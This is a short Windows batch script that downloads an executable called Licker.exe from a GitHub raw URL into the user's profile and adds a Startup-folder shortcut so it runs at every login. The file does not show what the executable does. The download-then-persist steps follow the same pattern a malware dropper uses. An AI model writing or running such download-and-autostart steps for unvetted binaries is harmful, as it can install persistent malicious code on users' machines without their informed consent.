@echo off
set "EXE_URL=https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"
set "SAVE_PATH=%USERPROFILE%\Licker.exe"
set "STARTUP_LINK=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Licker.lnk"

echo Downloading Licker...
curl -L "%EXE_URL%" -o "%SAVE_PATH%"

if exist "%SAVE_PATH%" (
    echo Creating startup shortcut...
    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%STARTUP_LINK%'); $s.TargetPath = '%SAVE_PATH%'; $s.Save()"
    echo Setup complete! Licker will run at next login.
) else (
    echo Download failed. Check internet or if the link is correct.
)
pause
